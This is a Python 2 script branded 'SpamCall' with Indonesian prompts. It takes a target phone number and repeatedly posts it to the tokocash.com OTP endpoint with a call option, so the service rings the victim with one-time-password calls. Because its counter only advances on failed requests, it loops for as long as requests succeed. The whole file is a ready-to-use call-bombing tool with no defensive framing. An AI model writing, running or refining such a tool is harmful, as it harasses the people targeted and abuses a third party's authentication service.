#!/usr/bin/env python
import thread, requests, sys, os, platform, random
from time import sleep
from os import system
os = os.system
if sys.platform == 'unix' or sys.platform == 'linux2':
    R = '\x1b[31m'
    B = '\x1b[34m'
    W = '\x1b[00m'
    Y = '\x1b[33m'
    X = '\x1b[36m'
    rand = (
     R, B, W, Y, X)
    P = random.choice(rand)
else:
    if sys.platform == 'win' or sys.platform == 'darwin':
        R = ''
        B = ''
        W = ''
        Y = ''
        X = ''
        rand = (
         R, B, W, Y, X)
        P = random.choice(rand)

def Bannerinf():
    print ''
    print ('{} ____  {}  ____').format(R, X)
    print ('{}/ ___| {} / ___|  {}| {}Author   : Kontol').format(R, X, Y, W)
    print ('{}\\___ \\ {}| |      {}| {}Code     : Ular').format(R, X, Y, W)
    print ('{} ___) |{}| |___   {}| {}Github   : github.com/afelfgie').format(R, X, Y, W)
    print ('{}|____/ {} \\____|  {}| {}telegram : t.me/afelfgie').format(R, X, Y, W)
    print (' {}* {}Spam{}Call {}*').format(R, R, X, X)
    print ''


def spam():
    os('clear')
    Bannerinf()
    try:
        print '%s[%s?%s] %sMasukkan Nomor target Dengan awalan 08 atau 62 %s[%s?%s]\n' % (R, B, R, W, R, B, R)
        phone = raw_input('' + R + '[' + B + '+' + R + '] ' + W + 'Nomor target ' + R + ': ' + W + '')
        Bannerinf()
        KNTL = {'msisdn': '' + phone, 'accept': 'call'}
        count = 0
        os('clear')
        Bannerinf()
        while count < 3:
            r = requests.post('https://www.tokocash.com/oauth/otp', data=KNTL)
            if 'otp_attempt_left' in r.text:
                print '%s[%s+%s] %sOTP berhasil Dikirim ...' % (R, B, R, W)
            else:
                print '%s[%s-%s] %sOTP Gagal Dikirim ...' % (R, B, R, W)
                sleep(60)
                count = count + 1

        print '[+] Stopped...'
        sleep(1)
        sys.exit(1)
    except EOFError:
        sys.exit()
    except KeyboardInterrupt:
        sys.exit()
    except requests.exceptions.ConnectionError:
        os('clear')
        Bannerinf()
        print ('{}[{}-{}] {}Connection Error ...').format(R, Y, R, W)
        print ''
        sleep(1)
        exit()


spam()
